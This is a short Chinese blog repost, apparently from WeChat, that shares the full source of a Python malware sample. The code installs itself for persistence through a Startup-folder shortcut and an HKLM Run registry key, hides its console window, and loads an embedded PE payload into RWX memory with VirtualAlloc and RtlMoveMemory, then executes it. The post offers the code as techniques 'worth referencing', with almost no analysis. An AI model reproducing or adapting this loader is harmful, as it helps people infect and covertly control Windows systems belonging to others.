\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/OKhYxqlrVEPLt5GKaSCZDw)

在国外看到的某个样本，因为注释都是中文的，可能来自国内，部分写法值得参考，故分享之

完整代码如下, 带注释的，自己看吧。

```
\# -\*- coding:utf-8 -\*-
from ctypes import \*
import ctypes
import re
import struct
import string
import binascii
import win32con
import win32api
import os
import sys
import pythoncom
import win32com.client as client
import hashlib
import time
def createShortCut(filename):  # 目前创建的无起始位置 - No starting position currently created
    """filename should be abspath, or there will be some strange errors"""
    try:
        # 设置快捷方式的起始位置，此处设置为windows启动目录 - Set the starting position of the shortcut, here is set to the windows startup directory
        working\_directory = os.getenv(
            'USERPROFILE') + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\\'
        # 创建快捷方式的目标绝对路径 - The absolute path of the target to create the shortcut
        lnkname = working\_directory + filename + '.lnk'
        # 要创建快捷方式的文件的绝对路径，此处是获取当前路径 - The absolute path of the file to create the shortcut, here is the current path
        filename = os.path.dirname(os.path.realpath(sys.argv\[0\])) + '\\\\' + filename
        shortcut = client.Dispatch("WScript.Shell").CreateShortCut(lnkname)
        shortcut.TargetPath = filename
        shortcut.save()
        print('配置开机自启') # Configure auto start
    except Exception as e:
        print(e.args)
def set\_shortcut(filename):  # 如无需特别设置图标，则可去掉iconname参数 - If you don’t need to set the icon, you can remove the iconname parameter
    print(filename)
    try:
        from win32com.shell import shell
        from win32com.shell import shellcon
        iconname = ""
        # 设置快捷方式的起始位置，此处设置为windows启动目录 - Set the starting position of the shortcut, here is set to the windows startup directory
        working\_directory = os.getenv(
            'USERPROFILE') + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\\'
        # 创建快捷方式的目标绝对路径 - The absolute path of the target to create the shortcut
        lnkname = working\_directory + filename + '.lnk'
        print(lnkname)    
        # 要创建快捷方式的文件的绝对路径，此处是获取当前路径 - The absolute path of the file to create the shortcut, here is the current path
        #filename = os.path.dirname(os.path.realpath(sys.argv\[0\])) + '\\\\' + filename
        shortcut = pythoncom.CoCreateInstance(
            shell.CLSID\_ShellLink, None,
            pythoncom.CLSCTX\_INPROC\_SERVER, shell.IID\_IShellLink)
        #shortcut.SetPath(filename)
        shortcut.SetPath(sys.argv\[0\])
        # 设置快捷方式的起始位置, 不然会出现找不到辅助文件的情况 - Set the starting position of the shortcut, otherwise the auxiliary file will not be found
        shortcut.SetWorkingDirectory(working\_directory)
        # 可有可无，没有就默认使用文件本身的图标 - Optional, if not, use the icon of the file itself by default
        shortcut.SetIconLocation(iconname, 0)
        if os.path.splitext(lnkname)\[-1\] != '.lnk':
            lnkname += ".lnk"
        shortcut.QueryInterface(pythoncom.IID\_IPersistFile).Save(lnkname, 0)
        return True
    except Exception as e:
        print(e.args)
        return False
def addfile2autorun(name):
    try:
        runpath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        hKey = win32api.RegOpenKeyEx(win32con.HKEY\_LOCAL\_MACHINE, runpath, 0, win32con.KEY\_SET\_VALUE)
        win32api.RegSetValueEx(hKey, name, 0, win32con.REG\_SZ, sys.argv\[0\])
        win32api.RegCloseKey(hKey)
    except Exception as e:
      pass
def executable\_code(buffer):
    buf = c\_char\_p(buffer)
    size = len(buffer)
    addr = libc.valloc(size)
    addr = c\_void\_p(addr)
    if 0 == addr: 
        raise Exception("Failed to allocate memory")
    memmove(addr, buf, size)
    if 0 != libc.mprotect(addr, len(buffer), PROT\_READ | PROT\_WRITE | PROT\_EXEC):
        raise Exception("Failed to set protection on buffer")
    return addr
def main():
    buf =  b""
    buf += b"\\x4d\\x5a\\xe8\\x00\\x00\\x00\\x00\\x5b\\x52\\x45\\x55\\x89\\xe5"
    buf += b"\\x81\\xc3\\x93\\x45\\x00\\x00\\xff\\xd3\\x81\\xc3\\x66\\x62\\x02"
    buf += b"\\x00\\x53\\x6a\\x04\\x50\\xff\\xd0\\x00\\x00\\x00\\x00\\x00\\x00"
    buf += b"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
    buf += b"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf8\\x00\\x00\\x00\\x0e"
    buf += b"\\x1f\\xba\\x0e\\x00\\xb4\\x09\\xcd\\x21\\xb8\\x01\\x4c\\xcd\\x21"
    buf += b"\\x54\\x68\\x69\\x73\\x20\\x70\\x72\\x6f\\x67\\x72\\x61\\x6d\\x20"
    buf += b"\\x63\\x61\\x6e\\x6e\\x6f\\x74\\x20\\x62\\x65\\x20\\x72\\x75\\x6e"
    buf += b"\\x20\\x69\\x6e\\x20\\x44\\x4f\\x53\\x20\\x6d\\x6f\\x64\\x65\\x2e"
    buf += b"\\x0d\\x0d\\x0a\\x24\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x49\\x9c"
    buf += b"\\x6e\\x3a\\x0d\\xfd\\x00\\x69\\x0d\\xfd\\x00\\x69\\x0d\\xfd\\x00"
    buf += b"\\x69\\x4b\\xac\\xe1\\x69\\x29\\xfd\\x00\\x69\\x4b\\xac\\xdf\\x69"
    buf += b"\\x1a\\xfd\\x00\\x69\\x4b\\xac\\xe0\\x69\\x8e\\xfd\\x00\\x69\\x0d"
    buf += b"\\xfd\\x01\\x69\\xce\\xfd\\x00\\x69\\x04\\x85\\x93\\x69\\x1c\\xfd"
    buf += b"\\x00\\x69\\x04\\x85\\x83\\x69\\x0c\\xfd\\x00\\x69\\x00\\xaf\\xe0"
    buf += b"\\x69\\x17\\xfd\\x00\\x69\\x00\\xaf\\xdc\\x69\\x0c\\xfd\\x00\\x69"
    buf += b"\\x00\\xaf\\xde\\x69\\x0c\\xfd\\x00\\x69\\x52\\x69\\x63\\x68\\x0d"
    buf += b"\\xfd\\x00\\x69\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
    buf += b"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
    buf += b"\\x00\\x50\\x45\\x00\\x00\\x4c\\x01\\x04\\x00\\x3c\\x97\\x52\\x5f"
    buf += b"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x02\\x21\\x0b"
    buf += b"\\x01\\x0c\\x00\\x00\\xf6\\x01\\x00\\x00\\xe6\\x00\\x00\\x00\\x00"
    buf += b"\\x00\\x00\\xaa\\x38\\x01\\x00\\x00\\x10\\x00\\x00\\x00\\x10\\x02"
    bufmd5 = get\_md5\_value(buf)  
    set\_shortcut("windows.dll-" + bufmd5)
    addfile2autorun("windows.dll-" + bufmd5)
    #libc = CDLL('libc.so.6')
    PROT\_READ = 1
    PROT\_WRITE = 2
    PROT\_EXEC = 4
    VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc
    VirtualProtect = ctypes.windll.kernel32.VirtualProtect
    shellcode = bytearray(buf)
    whnd = ctypes.windll.kernel32.GetConsoleWindow()   
    if whnd != 0:
           if 6669999999999999999999999999999999999==6669999999999999999999999999999999999:
                  ctypes.windll.user32.ShowWindow(whnd, 0)   
                  ctypes.windll.kernel32.CloseHandle(whnd)
    print ".................................."\*666
    memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c\_int(0), ctypes.c\_int(len(shellcode)), ctypes.c\_int(0x3000), ctypes.c\_int(0x40))
    buf = (ctypes.c\_char \* len(shellcode)).from\_buffer(shellcode)
    old = ctypes.c\_long(1)
    VirtualProtect(memorywithshell, ctypes.c\_int(len(shellcode)),0x40,ctypes.byref(old))
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c\_int(memorywithshell),
                                         buf,
                                         ctypes.c\_int(len(shellcode)))
    shell = cast(memorywithshell, CFUNCTYPE(c\_void\_p))
    shell()
    #进程不能退出 - Process cannot exit
    while True:
        time.sleep(1)
def get\_md5\_value(src):
    myMd5 = hashlib.md5()
    myMd5.update(src)
    myMd5\_Digest = myMd5.hexdigest()
    return myMd5\_Digest
if \_\_name\_\_ == '\_\_main\_\_':
    main()

```